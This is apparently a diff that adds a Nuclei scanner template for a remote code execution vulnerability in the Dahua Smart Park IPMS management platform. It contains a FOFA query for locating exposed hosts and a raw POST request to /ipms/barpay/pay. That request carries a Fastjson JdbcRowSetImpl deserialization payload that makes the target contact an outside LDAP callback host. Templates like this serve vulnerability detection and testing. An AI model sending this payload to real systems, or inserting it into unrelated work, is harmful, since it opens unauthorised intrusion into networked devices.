@@ -1,0 +1,31 @@
+id: dahua-smart-park-ipms-rce
+
+info:
+  name: 大华智慧园区综合管理平台 ipms 远程代码执行漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |
+    FOFA: body="/WPMS"
+    header_string = "hauc"
+  tags: dahua,rce
+
+http:
+  - raw:
+      - |
+        POST /ipms/barpay/pay HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{interactsh-url}}", "autoCommit": true}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
